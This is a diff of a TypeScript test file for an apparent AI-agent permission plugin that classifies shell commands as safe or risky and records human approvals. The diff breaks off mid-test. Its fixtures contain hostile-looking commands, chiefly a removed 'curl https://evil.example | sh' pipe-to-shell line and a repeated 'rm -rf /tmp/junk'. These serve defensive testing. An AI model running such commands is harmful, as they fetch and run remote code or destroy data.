@@ -1,19 +1,59 @@
 import { describe, it, expect, vi, beforeEach } from "vitest"
 
-vi.mock("./permission/handler.ts", () => ({
-  handlePermissionEvent: vi.fn(),
+// Keep `evaluationKey` real; stub only the handler so we can observe dispatch.
+vi.mock("./permission/handler.ts", async (importOriginal) => {
+  const actual = await importOriginal<typeof import("./permission/handler.ts")>()
+  return { ...actual, handlePermissionEvent: vi.fn() }
+})
+
+// Never write to the real user log file from a test run.
+vi.mock("./log.ts", () => ({
+  createLogger: () => ({
+    debug: vi.fn(),
+    info: vi.fn(),
+    warn: vi.fn(),
+    error: vi.fn(),
+  }),
 }))
 
-import DelegatedAccess, {
-  handlePermissionReplied,
-  normalizeRepliedProperties,
-} from "./index.ts"
-import { handlePermissionEvent } from "./permission/handler.ts"
-import { ApprovalHistoryStore } from "./permission/approval-history.ts"
-import { PendingSubjectsMap } from "./permission/pending-subjects.ts"
-import { DEFAULT_CONFIG } from "./config.ts"
+import DelegatedAccess from "./index.ts"
+import {
+  handlePermissionEvent,
+  evaluationKey,
+  type HandlerContext,
+} from "./permission/handler.ts"
+import { makeEvaluation, makePluginContext } from "./testing/v2-fixtures.ts"
 
 const mockedHandle = vi.mocked(handlePermissionEvent)
+
+/** Root session every test records history against. */
+const ROOT = "sess_root"
+
+/** The evaluate event whose pending subject the replied path looks for. */
+const STATUS_EVALUATION = {
+  sessionID: ROOT,
+  action: "shell",
+  resources: ["git status"],
+}
+const STATUS_KEY = evaluationKey(STATUS_EVALUATION)
+
+/** The permission request the plugin's `permission.list` reports back. */
+const STATUS_REQUEST = { id: "perm_1", action: "shell", resources: ["git status"] }
+
+/**
+ * Let the plugin's background event loop drain everything queued so far.
+ *
+ * The loop is pure promise chaining with no timers or I/O, and the fixture
+ * stream drains its queue in FIFO order before reporting `done`, so a closed
+ * stream plus a couple of macrotask turns settles every pushed event. This is
+ * what makes the "nothing was recorded" assertions meaningful instead of
+ * passing trivially at t=0.
+ */
+async function drainEventLoop() {
+  for (let i = 0; i < 3; i++) {
+    await new Promise((resolve) => setTimeout(resolve, 0))
+  }
+}
 
 beforeEach(() => {
   mockedHandle.mockReset()
@@ -22,671 +62,410 @@ beforeEach(() => {
   })
 })
 
-async function makePluginHooks(
-  options?: Record<string, unknown>,
-) {
-  const pluginInput = {
-    client: {} as unknown,
-    project: {} as unknown,
-    directory: "/tmp",
-    worktree: "/tmp",
-    serverUrl: new URL("http://127.0.0.1:1234"),
-    $: (() => {}) as unknown,
-  }
-  // Our plugin registers extra hook keys ("permission.updated") that aren't
-  // in the Hooks interface; cast the return type for ergonomic access.
-  return (await DelegatedAccess(
-    pluginInput as never,
-    options as never,
-  )) as unknown as Record<
-    string,
-    ((...args: unknown[]) => Promise<void>) | undefined
-  >
+/**
+ * Run the V2 plugin's `setup` against a fake context and hand back the hooks
+ * it registered. `setup` is a plain method on the exported plugin object —
+ * there is no callable factory in V2.
+ */
+async function setupPlugin(options?: Record<string, unknown>) {
+  const { ctx, session, permission, event } = makePluginContext({ options })
+
+  await DelegatedAccess.setup(ctx as never)
+
+  const evaluate = permission.hook.mock.calls.find(
+    (call) => call[0] === "evaluate",
+  )?.[1] as ((ev: unknown) => Promise<void>) | undefined
+
+  const contextHook = session.hook.mock.calls.find(
+    (call) => call[0] === "context",
+  )?.[1] as ((request: unknown) => void) | undefined
+
+  return { evaluate, contextHook, session, permission, event, ctx }
 }
 
-function basePermission(overrides: Record<string, unknown> = {}) {
+/** One pending subject, as the evaluate path would have seeded it. */
+type PendingSpec = {
+  sessionID: string
+  action: string
+  resources: string[]
+  entry: {
+    rootSessionID: string
+    subject: string
+    subjectLabel: string
+    classifierVerdict: "SAFE" | "RISKY" | null
+    classifierReason: string | null
+    autoApproved: boolean
+  }
+}
+
+type RepliedEvent = { data: unknown; type?: string }
+
+/**
+ * Drive the whole `permission.replied` path the way production does: seed
+ * pending subjects from inside the evaluate hook, then push events into the
+ * plugin's background event stream and let it settle.
+ *
+ * `handlePermissionReplied` is module-private, so this is the only honest way
+ * to reach it.
+ */
+async function driveReplied(args: {
+  options?: Record<string, unknown>
+  /** What `ctx.permission.list` reports for the session. */
+  requests?: Array<{ id: string; action: string; resources: string[] }>
+  pending?: PendingSpec[]
+  events: RepliedEvent[]
+}) {
+  const { evaluate, permission, event } = await setupPlugin(args.options)
+  if (args.requests) {
+    permission.list.mockResolvedValue(args.requests as never)
+  }
+
+  let ctx: HandlerContext | undefined
+  mockedHandle.mockImplementationOnce(async (_ev, handlerCtx) => {
+    ctx = handlerCtx
+    for (const spec of args.pending ?? []) {
+      handlerCtx.pendingSubjects.set(
+        evaluationKey({
+          sessionID: spec.sessionID,
+          action: spec.action,
+          resources: spec.resources,
+        }),
+        spec.entry,
+      )
+    }
+  })
+
+  const first = args.pending?.[0]
+  await evaluate!(
+    makeEvaluation({
+      sessionID: first?.sessionID ?? ROOT,
+      action: first?.action ?? "shell",
+      resources: first?.resources ?? ["git status"],
+    }),
+  )
+
+  for (const e of args.events) {
+    event.push({ type: e.type ?? "permission.replied", data: e.data })
+  }
+  event.close()
+  await drainEventLoop()
+
+  return ctx!
+}
+
+/** A RISKY pending subject for `git status`, the common case here. */
+function riskyPending(
+  args: {
+    subject?: string
+    resources?: string[]
+    entry?: Partial<PendingSpec["entry"]>
+  } = {},
+): PendingSpec {
+  const resources = args.resources ?? ["git status"]
   return {
-    id: "perm_1",
-    type: "bash",
-    pattern: "ls",
-    sessionID: "sess_main",
-    messageID: "msg_1",
-    title: "t",
-    metadata: {},
-    time: { created: 0 },
-    ...overrides,
+    sessionID: ROOT,
+    action: "shell",
+    resources,
+    entry: {
+      rootSessionID: ROOT,
+      subject: args.subject ?? "rm -rf /tmp/junk",
+      subjectLabel: "command",
+      classifierVerdict: "RISKY",
+      classifierReason: "rm outside project",
+      autoApproved: false,
+      ...args.entry,
+    },
   }
 }
 
-function eventInput(type: string, permission: Record<string, unknown>) {
-  return { event: { type, properties: permission } } as never
-}
+describe("DelegatedAccess setup — V2 hook registration", () => {
+  it("registers the permission evaluate hook, the session context hook, and the event stream", async () => {
+    const { evaluate, contextHook, event } = await setupPlugin()
 
-describe("DelegatedAccess plugin entry — shotgun hook registration", () => {
-  it("registers config, permission.ask, permission.updated, and event hooks", async () => {
-    const hooks = await makePluginHooks()
-    expect(typeof hooks["config"]).toBe("function")
-    expect(typeof hooks["permission.ask"]).toBe("function")
-    expect(typeof hooks["permission.updated"]).toBe("function")
-    expect(typeof hooks["event"]).toBe("function")
+    expect(typeof evaluate).toBe("function")
+    expect(typeof contextHook).toBe("function")
+    expect(event.subscribe).toHaveBeenCalledTimes(1)
   })
 
-  // --- permission.ask hook (typed, with output) -------------------------
+  it("dispatches each evaluation to the handler with a handler context", async () => {
+    const { evaluate } = await setupPlugin()
+    const ev = makeEvaluation()
 
-  it("permission.ask: dispatches with output and hookName='permission.ask'", async () => {
-    const hooks = await makePluginHooks()
-    const output = { status: "ask" }
-    await hooks["permission.ask"]!(basePermission() as never, output as never)
+    await evaluate!(ev)
 
     expect(mockedHandle).toHaveBeenCalledTimes(1)
-    const call = mockedHandle.mock.calls[0]
-    expect((call?.[0] as { id: string }).id).toBe("perm_1")
-    expect(call?.[2]?.hookName).toBe("permission.ask")
-    expect(call?.[2]?.output).toBe(output)
+    expect(mockedHandle.mock.calls[0]?.[0]).toBe(ev)
+    const ctx = mockedHandle.mock.calls[0]?.[1]
+    expect(typeof ctx.log.info).toBe("function")
+    expect(ctx.pendingSubjects).toBeDefined()
   })
 
-  // --- permission.updated hook (untyped) --------------------------------
-
-  it("permission.updated: dispatches with hookName='permission.updated', no output", async () => {
-    const hooks = await makePluginHooks()
-    // Input shape probe: try raw permission first.
-    await hooks["permission.updated"]!(basePermission() as never)
-
-    expect(mockedHandle).toHaveBeenCalledTimes(1)
-    const call = mockedHandle.mock.calls[0]
-    expect(call?.[2]?.hookName).toBe("permission.updated")
-    expect(call?.[2]?.output).toBeUndefined()
-  })
-
-  it("permission.updated: extracts permission from input.permission wrapper", async () => {
-    const hooks = await makePluginHooks()
-    await hooks["permission.updated"]!({
-      permission: basePermission({ id: "perm_wrapped" }),
-    } as never)
-
-    expect(mockedHandle).toHaveBeenCalledTimes(1)
-    const call = mockedHandle.mock.calls[0]
-    expect((call?.[0] as { id: string }).id).toBe("perm_wrapped")
-  })
-
-  it("permission.updated: silently ignores input without a permission", async () => {
-    const hooks = await makePluginHooks()
-    await hooks["permission.updated"]!({ nothing: "useful" } as never)
-    expect(mockedHandle).not.toHaveBeenCalled()
-  })
-
-  // --- event hook (generic) ---------------------------------------------
-
-  it("event: dispatches for permission.asked with hookName='event:permission.asked'", async () => {
-    const hooks = await makePluginHooks()
-    await hooks["event"]!(eventInput("permission.asked", basePermission()))
-
-    expect(mockedHandle).toHaveBeenCalledTimes(1)
-    const call = mockedHandle.mock.calls[0]
-    expect(call?.[2]?.hookName).toBe("event:permission.asked")
-  })
-
-  it("event: dispatches for permission.updated with hookName='event:permission.updated'", async () => {
-    const hooks = await makePluginHooks()
-    await hooks["event"]!(
-      eventInput("permission.updated", basePermission({ id: "perm_ev_u" })),
-    )
-
-    expect(mockedHandle).toHaveBeenCalledTimes(1)
-    const call = mockedHandle.mock.calls[0]
-    expect(call?.[2]?.hookName).toBe("event:permission.updated")
-  })
-
-  it("event: ignores unrelated event types", async () => {
-    const hooks = await makePluginHooks()
-    await hooks["event"]!(eventInput("session.idle", {}))
-    await hooks["event"]!(eventInput("chat.message", {}))
-    expect(mockedHandle).not.toHaveBeenCalled()
-  })
-
-  // --- cross-hook dedupe ------------------------------------------------
-
-  it("dedupes: the same permissionID is only dispatched once across hooks", async () => {
-    const hooks = await makePluginHooks()
-    const permission = basePermission({ id: "perm_shared" })
-
-    // Fire the same permission through all three hooks + twice-per-hook.
-    await hooks["permission.ask"]!(permission as never, { status: "ask" } as never)
-    await hooks["permission.ask"]!(permission as never, { status: "ask" } as never)
-    await hooks["permission.updated"]!(permission as never)
-    await hooks["permission.updated"]!(permission as never)
-    await hooks["event"]!(eventInput("permission.asked", permission))
-    await hooks["event"]!(eventInput("permission.updated", permission))
-
-    // Only the first hook that wins gets to dispatch.
-    expect(mockedHandle).toHaveBeenCalledTimes(1)
-  })
-
-  // --- loop guard -------------------------------------------------------
-
-  it("skips permission events whose sessionID is an ephemeral classifier session", async () => {
-    const hooks = await makePluginHooks()
-
-    // First call: normal session. Handler runs and registers a classifier
-    // session ID on the shared ephemeralSessionIDs set.
-    mockedHandle.mockImplementationOnce(async (_perm, ctx) => {
+  it("skips evaluations from its own ephemeral classifier sessions (loop guard)", async () => {
+    const { evaluate } = await setupPlugin()
+    mockedHandle.mockImplementationOnce(async (_ev, ctx) => {
       ctx.ephemeralSessionIDs.add("sess_classifier")
     })
-    await hooks["permission.updated"]!(basePermission({ sessionID: "sess_main" }) as never)
 
-    // Second call: from the classifier session — must be skipped.
-    await hooks["permission.updated"]!(
-      basePermission({ id: "perm_loop", sessionID: "sess_classifier" }) as never,
-    )
+    await evaluate!(makeEvaluation({ sessionID: ROOT }))
+    await evaluate!(makeEvaluation({ sessionID: "sess_classifier" }))
 
-    expect(mockedHandle).toHaveBeenCalledTimes(1) // not 2
+    expect(mockedHandle).toHaveBeenCalledTimes(1)
   })
 
-  // --- input validation -------------------------------------------------
+  it("swallows handler exceptions and leaves effect untouched (fail-closed)", async () => {
+    const { evaluate } = await setupPlugin()
+    mockedHandle.mockImplementation(async () => {
+      throw new Error("unexpected boom")
+    })
 
-  it("ignores events whose permission lacks an id or sessionID", async () => {
-    const hooks = await makePluginHooks()
-    await hooks["event"]!({
-      event: { type: "permission.asked", properties: {} },
-    } as never)
-    await hooks["event"]!({
-      event: { type: "permission.asked", properties: { id: 123 } },
-    } as never)
-    expect(mockedHandle).not.toHaveBeenCalled()
+    const ev = makeEvaluation()
+
+    await expect(evaluate!(ev)).resolves.toBeUndefined()
+    // Untouched "ask" is the whole point: an exception must never
+    // auto-approve the command.
+    expect(ev.effect).toBe("ask")
   })
+})
 
-  // --- plugin config (tuple-form options) -------------------------------
+describe("plugin options → handler config", () => {
+  async function configFor(options?: Record<string, unknown>) {
+    const { evaluate } = await setupPlugin(options)
+    await evaluate!(makeEvaluation())
+    return mockedHandle.mock.calls[0]?.[1]
+  }
 
-  it("uses defaults when no plugin options are supplied", async () => {
-    const hooks = await makePluginHooks()
-    await hooks["permission.updated"]!(basePermission() as never)
-    const ctx = mockedHandle.mock.calls[0]?.[1]
+  it("uses defaults when no options are supplied", async () => {
+    const ctx = await configFor()
     expect(ctx?.config.enabled).toBe(true)
+    expect(ctx?.config.contextMessageCount).toBe(3)
     expect(ctx?.sessionModel).toBeUndefined()
-    // Logger is wired through into every dispatch.
-    expect(typeof ctx?.log?.info).toBe("function")
-    expect(typeof ctx?.log?.error).toBe("function")
   })
 
-  it("uses defaults when plugin options is an empty object", async () => {
-    const hooks = await makePluginHooks({})
-    await hooks["permission.updated"]!(basePermission() as never)
-    const ctx = mockedHandle.mock.calls[0]?.[1]
+  it("uses defaults when options is an empty object", async () => {
+    const ctx = await configFor({})
     expect(ctx?.config.enabled).toBe(true)
-    expect(ctx?.config.contextMessageCount).toBe(3) // default
+    expect(ctx?.config.contextMessageCount).toBe(3)
   })
 
-  it("applies tuple-form plugin options at factory time", async () => {
-    const hooks = await makePluginHooks({
+  it("applies tuple-form options", async () => {
+    const ctx = await configFor({
       enabled: false,
       contextMessageCount: 5,
       safeCountdownMs: 0,
     })
-    await hooks["permission.updated"]!(basePermission() as never)
-    const ctx = mockedHandle.mock.calls[0]?.[1]
     expect(ctx?.config.enabled).toBe(false)
     expect(ctx?.config.contextMessageCount).toBe(5)
     expect(ctx?.config.safeCountdownMs).toBe(0)
   })
 
-  it("falls back to defaults when tuple-form options are invalid", async () => {
-    const hooks = await makePluginHooks({
-      enabled: "not a boolean",
-    } as Record<string, unknown>)
-    await hooks["permission.updated"]!(basePermission() as never)
-    const ctx = mockedHandle.mock.calls[0]?.[1]
+  it("falls back to defaults when options are invalid", async () => {
+    const ctx = await configFor({ enabled: "not a boolean" })
     expect(ctx?.config.enabled).toBe(true)
     expect(ctx?.config.contextMessageCount).toBe(3)
   })
 
-  // --- session model (still extracted from the config hook input) -------
-
-  it("parses session model from config.model", async () => {
-    const hooks = await makePluginHooks()
-    await hooks["config"]!({ model: "anthropic/claude-sonnet-4-5" } as never)
-
-    await hooks["permission.updated"]!(basePermission() as never)
-    const ctx = mockedHandle.mock.calls[0]?.[1]
+  it("parses the classifier fallback model from options.model", async () => {
+    const ctx = await configFor({ model: "anthropic/claude-sonnet-4-5" })
     expect(ctx?.sessionModel).toEqual({
       providerID: "anthropic",
       modelID: "claude-sonnet-4-5",
     })
   })
+})
 
-  it("falls back to config.small_model if config.model is absent", async () => {
-    const hooks = await makePluginHooks()
-    await hooks["config"]!({ small_model: "openai/gpt-4.1-mini" } as never)
-
-    await hooks["permission.updated"]!(basePermission() as never)
+describe("repo context wiring", () => {
+  it("exposes getRepoContext returning a { pinned, current } snapshot", async () => {
+    const { evaluate } = await setupPlugin()
+    await evaluate!(makeEvaluation())
     const ctx = mockedHandle.mock.calls[0]?.[1]
-    expect(ctx?.sessionModel).toEqual({
-      providerID: "openai",
-      modelID: "gpt-4.1-mini",
-    })
-  })
 
-  it("ignores any top-level `delegatedAccess` key on the config hook input", async () => {
-    // Defensive: opencode rejects unknown top-level keys at startup, so
-    // this shape would never reach a real plugin in production. But we
-    // assert the plugin's own config isn't accidentally re-resolved from
-    // the config hook either.
-    const hooks = await makePluginHooks({ enabled: true })
-    await hooks["config"]!({
-      delegatedAccess: { enabled: false },
-    } as never)
-    await hooks["permission.updated"]!(basePermission() as never)
-    const ctx = mockedHandle.mock.calls[0]?.[1]
-    expect(ctx?.config.enabled).toBe(true)
-  })
+    expect(typeof ctx?.getRepoContext).toBe("function")
 
-  // --- error safety -----------------------------------------------------
-
-  it("swallows exceptions from handlePermissionEvent in every hook path", async () => {
-    mockedHandle.mockImplementation(async () => {
-      throw new Error("unexpected boom")
-    })
-
-    const hooks = await makePluginHooks()
-    await expect(
-      hooks["permission.ask"]!(basePermission() as never, { status: "ask" } as never),
-    ).resolves.toBeUndefined()
-
-    // Fresh permission id so dedupe doesn't swallow the call.
-    await expect(
-      hooks["permission.updated"]!(basePermission({ id: "perm_e_u" }) as never),
-    ).resolves.toBeUndefined()
-
-    await expect(
-      hooks["event"]!(
-        eventInput("permission.asked", basePermission({ id: "perm_e_ev" })),
-      ),
-    ).resolves.toBeUndefined()
+    const dual = await ctx!.getRepoContext!()
+    expect(dual).not.toBeNull()
+    expect("pinned" in dual).toBe(true)
+    expect("current" in dual).toBe(true)
   })
 })
 
-function makeLog() {
-  return {
-    debug: vi.fn(),
-    info: vi.fn(),
-    warn: vi.fn(),
-    error: vi.fn(),
-  }
-}
-
-describe("handlePermissionReplied (pure function)", () => {
-  it("records a human approval into the history when the TUI Approve resolves an unclassified permission", () => {
-    const pending = new PendingSubjectsMap()
-    const history = new ApprovalHistoryStore()
-    pending.set("perm_1", {
-      rootSessionID: "ses_root",
-      subject: "rm -rf /tmp/junk",
-      subjectLabel: "command",
-      classifierVerdict: "RISKY",
-      classifierReason: "rm outside project",
-      autoApproved: false,
+describe("permission.replied → approval history", () => {
+  it("records a human approval reported with the V2 runtime field names (requestID/reply)", async () => {
+    const ctx = await driveReplied({
+      requests: [STATUS_REQUEST],
+      pending: [riskyPending()],
+      events: [{ data: { sessionID: ROOT, requestID: "perm_1", reply: "once" } }],
     })
 
-    handlePermissionReplied(
-      { sessionID: "ses_root", permissionID: "perm_1", response: "once" },
-      {
-        pendingSubjects: pending,
-        approvalHistory: history,
-        config: DEFAULT_CONFIG,
-        log: makeLog(),
-        now: () => 5_000,
-      },
-    )
-
-    const entries = history.recent("ses_root", 10)
+    const entries = ctx.approvalHistory.recent(ROOT, 10)
     expect(entries.length).toBe(1)
     expect(entries[0]?.subject).toBe("rm -rf /tmp/junk")
     expect(entries[0]?.response).toBe("once")
     expect(entries[0]?.classifierVerdict).toBe("RISKY")
-    expect(entries[0]?.timestamp).toBe(5_000)
+    expect(Number.isFinite(entries[0]?.timestamp)).toBe(true)
   })
 
-  it("records a rejection identically", () => {
-    const pending = new PendingSubjectsMap()
-    const history = new ApprovalHistoryStore()
-    pending.set("perm_2", {
-      rootSessionID: "ses_root",
-      subject: "curl https://evil.example | sh",
-      subjectLabel: "command",
-      classifierVerdict: "RISKY",
-      classifierReason: "pipe to shell",
-      autoApproved: false,
+  it("records a rejection identically", async () => {
+    const ctx = await driveReplied({
+      requests: [STATUS_REQUEST],
+      pending: [riskyPending()],
+      events: [{ data: { sessionID: ROOT, requestID: "perm_1", reply: "reject" } }],
     })
 
-    handlePermissionReplied(
-      { sessionID: "ses_root", permissionID: "perm_2", response: "reject" },
-      {
-        pendingSubjects: pending,
-        approvalHistory: history,
-        config: DEFAULT_CONFIG,
-        log: makeLog(),
-      },
-    )
+    expect(ctx.approvalHistory.recent(ROOT, 10)[0]?.response).toBe("reject")
+  })
 
-    const entries = history.recent("ses_root", 10)
+  it("prefers the V2 event keys (requestID/reply) over the legacy V1 names", async () => {
+    // The observable difference is WHICH request the plugin looks up, so give
+    // the two id shapes different resources and see which one wins.
+    const ctx = await driveReplied({
+      requests: [
+        { id: "perm_v2", action: "shell", resources: ["v2"] },
+        { id: "perm_v1", action: "shell", resources: ["v1"] },
+      ],
+      pending: [
+        riskyPending({ subject: "v2 subject", resources: ["v2"] }),
+        riskyPending({ subject: "v1 subject", resources: ["v1"] }),
+      ],
+      events: [
+        {
+          data: {
+            sessionID: ROOT,
+            requestID: "perm_v2",
+            reply: "once",
+            permissionID: "perm_v1",
+            response: "reject",
+          },
+        },
+      ],
+    })
+
+    const entries = ctx.approvalHistory.recent(ROOT, 10)
+    expect(entries.length).toBe(1)
+    expect(entries[0]?.subject).toBe("v2 subject")
+    expect(entries[0]?.response).toBe("once")
+  })
+
+  it("accepts the legacy V1 names when the V2 names are absent", async () => {
+    const ctx = await driveReplied({
+      requests: [STATUS_REQUEST],
+      pending: [riskyPending()],
+      events: [
+        { data: { sessionID: ROOT, permissionID: "perm_1", response: "reject" } },
+      ],
+    })
+
+    const entries = ctx.approvalHistory.recent(ROOT, 10)
     expect(entries.length).toBe(1)
     expect(entries[0]?.response).toBe("reject")
   })
 
-  it("skips our own auto-approvals (autoApproved=true) so history stays pure-human-signal", () => {
-    const pending = new PendingSubjectsMap()
-    const history = new ApprovalHistoryStore()
-    pending.set("perm_3", {
-      rootSessionID: "ses_root",
-      subject: "ls",
-      subjectLabel: "command",
-      classifierVerdict: "SAFE",
-      classifierReason: "read-only",
-      autoApproved: true,
+  it("skips our own auto-approvals so history stays pure human signal", async () => {
+    const ctx = await driveReplied({
+      requests: [STATUS_REQUEST],
+      pending: [riskyPending({ entry: { autoApproved: true } })],
+      events: [{ data: { sessionID: ROOT, requestID: "perm_1", reply: "once" } }],
     })
 
-    handlePermissionReplied(
-      { sessionID: "ses_root", permissionID: "perm_3", response: "once" },
-      {
-        pendingSubjects: pending,
-        approvalHistory: history,
-        config: DEFAULT_CONFIG,
-        log: makeLog(),
-      },
-    )
-
-    expect(history.recent("ses_root", 10)).toEqual([])
+    expect(ctx.approvalHistory.recent(ROOT, 10)).toEqual([])
+    // The handler reached the pending subject and consumed it — proof the
+    // event was processed rather than ignored.
+    expect(ctx.pendingSubjects.take(STATUS_KEY)).toBeNull()
   })
 
-  it("is a no-op when no pending entry exists for the permissionID", () => {
-    const pending = new PendingSubjectsMap()
-    const history = new ApprovalHistoryStore()
-
-    handlePermissionReplied(
-      {
-        sessionID: "ses_root",
-        permissionID: "perm_unknown",
-        response: "once",
-      },
-      {
-        pendingSubjects: pending,
-        approvalHistory: history,
-        config: DEFAULT_CONFIG,
-        log: makeLog(),
-      },
-    )
-
-    expect(history.recent("ses_root", 10)).toEqual([])
-  })
-
-  it("is a no-op when approvalHistoryEnabled is false", () => {
-    const pending = new PendingSubjectsMap()
-    const history = new ApprovalHistoryStore()
-    pending.set("perm_4", {
-      rootSessionID: "ses_root",
-      subject: "ls",
-      subjectLabel: "command",
-      classifierVerdict: "RISKY",
-      classifierReason: "weird",
-      autoApproved: false,
+  it("records a placeholder verdict when the human resolved before the classifier finished", async () => {
+    const ctx = await driveReplied({
+      requests: [STATUS_REQUEST],
+      pending: [riskyPending({ entry: { classifierVerdict: null, classifierReason: null } })],
+      events: [{ data: { sessionID: ROOT, requestID: "perm_1", reply: "once" } }],
     })
 
-    handlePermissionReplied(
-      { sessionID: "ses_root", permissionID: "perm_4", response: "once" },
-      {
-        pendingSubjects: pending,
-        approvalHistory: history,
-        config: { ...DEFAULT_CONFIG, approvalHistoryEnabled: false },
-        log: makeLog(),
-      },
-    )
-
-    expect(history.recent("ses_root", 10)).toEqual([])
-    // Pending entry should NOT have been taken either when disabled.
-    expect(pending.take("perm_4")).not.toBeNull()
+    const entry = ctx.approvalHistory.recent(ROOT, 10)[0]
+    expect(entry?.classifierVerdict).toBe("RISKY")
+    expect(entry?.classifierReason).toMatch(/classifier did not complete/)
   })
 
-  it("ignores unrecognised response values without recording", () => {
-    const pending = new PendingSubjectsMap()
-    const history = new ApprovalHistoryStore()
-    pending.set("perm_5", {
-      rootSessionID: "ses_root",
-      subject: "ls",
-      subjectLabel: "command",
-      classifierVerdict: "RISKY",
-      classifierReason: "x",
-      autoApproved: false,
+  it("does not record for an unrecognised reply value, but still consumes the pending subject", async () => {
+    const ctx = await driveReplied({
+      requests: [STATUS_REQUEST],
+      pending: [riskyPending()],
+      events: [{ data: { sessionID: ROOT, requestID: "perm_1", reply: "maybe" } }],
     })
 
-    handlePermissionReplied(
-      { sessionID: "ses_root", permissionID: "perm_5", response: "weird" },
-      {
-        pendingSubjects: pending,
-        approvalHistory: history,
-        config: DEFAULT_CONFIG,
-        log: makeLog(),
-      },
-    )
-
-    expect(history.recent("ses_root", 10)).toEqual([])
+    expect(ctx.approvalHistory.recent(ROOT, 10)).toEqual([])
+    expect(ctx.pendingSubjects.take(STATUS_KEY)).toBeNull()
   })
 
-  it("records with placeholder verdict when classifier did not complete before human resolved", () => {
-    const pending = new PendingSubjectsMap()
-    const history = new ApprovalHistoryStore()
-    pending.set("perm_6", {
-      rootSessionID: "ses_root",
-      subject: "ls",
-      subjectLabel: "command",
-      classifierVerdict: null,
-      classifierReason: null,
-      autoApproved: false,
+  it("is a no-op when no pending subject exists for the request", async () => {
+    const ctx = await driveReplied({
+      requests: [STATUS_REQUEST],
+      events: [{ data: { sessionID: ROOT, requestID: "perm_unknown", reply: "once" } }],
+      // A pending entry for a *different* subject proves the loop ran.
+      pending: [riskyPending()],
     })
 
-    handlePermissionReplied(
-      { sessionID: "ses_root", permissionID: "perm_6", response: "once" },
-      {
-        pendingSubjects: pending,
-        approvalHistory: history,
-        config: DEFAULT_CONFIG,
-        log: makeLog(),
-      },
-    )
+    expect(ctx.approvalHistory.recent(ROOT, 10)).toEqual([])
+  })
 
-    const entries = history.recent("ses_root", 10)
+  it("honours approvalHistoryEnabled=false without consuming the pending entry", async () => {
+    const ctx = await driveReplied({
+      options: { approvalHistoryEnabled: false },
+      requests: [STATUS_REQUEST],
+      pending: [riskyPending()],
+      events: [{ data: { sessionID: ROOT, requestID: "perm_1", reply: "once" } }],
+    })
+
+    expect(ctx.approvalHistory.recent(ROOT, 10)).toEqual([])
+    // Disabled means disabled: the entry is left for a later decision.
+    expect(ctx.pendingSubjects.take(STATUS_KEY)).not.toBeNull()
+  })
+
+  it.each([
+    ["a missing sessionID", { requestID: "perm_1", reply: "once" }],
+    ["no recognisable request id", { sessionID: ROOT, reply: "once" }],
+    ["no recognisable reply", { sessionID: ROOT, requestID: "perm_1" }],
+    ["a non-object payload", "nonsense"],
+    ["a null payload", null],
+  ])("ignores %s and keeps the event loop alive", async (_label, data) => {
+    // The second, well-formed event proves the malformed one was skipped
+    // rather than crashing the background loop.
+    const ctx = await driveReplied({
+      requests: [
+        STATUS_REQUEST,
+        { id: "perm_2", action: "shell", resources: ["ls"] },
+      ],
+      pending: [
+        riskyPending(),
+        riskyPending({ subject: "ls", resources: ["ls"] }),
+      ],
+      events: [
+        { data },
+        { data: { sessionID: ROOT, requestID: "perm_2", reply: "once" } },
+      ],
+    })
+
+    const entries = ctx.approvalHistory.recent(ROOT, 10)
     expect(entries.length).toBe(1)
-    expect(entries[0]?.classifierVerdict).toBe("RISKY")
-    expect(entries[0]?.classifierReason).toMatch(/classifier did not complete/)
+    expect(entries[0]?.subject).toBe("ls")
   })
-})
 
-describe("event hook wiring for permission.replied", () => {
-  it("dispatches permission.replied through the event hook into the recorded history", async () => {
-    const hooks = await makePluginHooks()
-    // We can't directly inspect the plugin's internal ApprovalHistoryStore,
-    // but we can verify the event hook doesn't throw and doesn't trigger
-    // handlePermissionEvent (which is what other event types do).
-    mockedHandle.mockClear()
-    await hooks["event"]!({
-      event: {
-        type: "permission.replied",
-        properties: {
-          sessionID: "ses_test",
-          permissionID: "perm_repl_1",
-          response: "once",
+  it("ignores unrelated event types", async () => {
+    const ctx = await driveReplied({
+      requests: [STATUS_REQUEST],
+      pending: [riskyPending()],
+      events: [
+        {
+          type: "session.idle",
+          data: { sessionID: ROOT, requestID: "perm_1", reply: "once" },
         },
-      },
-    } as never)
-    // permission.replied does NOT call handlePermissionEvent.
-    expect(mockedHandle).not.toHaveBeenCalled()
-  })
-
-  it("ignores malformed permission.replied events", async () => {
-    const hooks = await makePluginHooks()
-    mockedHandle.mockClear()
-    await hooks["event"]!({
-      event: {
-        type: "permission.replied",
-        properties: { sessionID: 123 }, // wrong types
-      },
-    } as never)
-    expect(mockedHandle).not.toHaveBeenCalled()
-    // No throw means the malformed-event guard worked.
-  })
-})
-
-describe("normalizeRepliedProperties", () => {
-  it("accepts the SDK-declared shape verbatim", () => {
-    expect(
-      normalizeRepliedProperties({
-        sessionID: "ses_1",
-        permissionID: "perm_1",
-        response: "once",
-      }),
-    ).toEqual({
-      sessionID: "ses_1",
-      permissionID: "perm_1",
-      response: "once",
-    })
-  })
-
-  it("normalises the runtime shape (requestID/reply) to the SDK shape", () => {
-    // OpenCode 1.4.x's runtime emits these field names rather than the
-    // SDK-typed permissionID/response. This is observed in production
-    // logs: properties={"sessionID":"…","requestID":"…","reply":"once"}.
-    expect(
-      normalizeRepliedProperties({
-        sessionID: "ses_1",
-        requestID: "perm_1",
-        reply: "once",
-      }),
-    ).toEqual({
-      sessionID: "ses_1",
-      permissionID: "perm_1",
-      response: "once",
-    })
-  })
-
-  it("prefers SDK keys when both shapes are present (canonical wins)", () => {
-    expect(
-      normalizeRepliedProperties({
-        sessionID: "ses_1",
-        permissionID: "perm_canonical",
-        response: "once",
-        requestID: "perm_runtime",
-        reply: "reject",
-      }),
-    ).toEqual({
-      sessionID: "ses_1",
-      permissionID: "perm_canonical",
-      response: "once",
-    })
-  })
-
-  it("returns null when sessionID is missing", () => {
-    expect(
-      normalizeRepliedProperties({
-        permissionID: "perm_1",
-        response: "once",
-      }),
-    ).toBeNull()
-  })
-
-  it("returns null when neither permissionID nor requestID is a string", () => {
-    expect(
-      normalizeRepliedProperties({
-        sessionID: "ses_1",
-        response: "once",
-      }),
-    ).toBeNull()
-  })
-
-  it("returns null when neither response nor reply is a string", () => {
-    expect(
-      normalizeRepliedProperties({
-        sessionID: "ses_1",
-        permissionID: "perm_1",
-      }),
-    ).toBeNull()
-  })
-
-  it("returns null for non-object inputs", () => {
-    expect(normalizeRepliedProperties(null)).toBeNull()
-    expect(normalizeRepliedProperties(undefined)).toBeNull()
-    expect(normalizeRepliedProperties("string")).toBeNull()
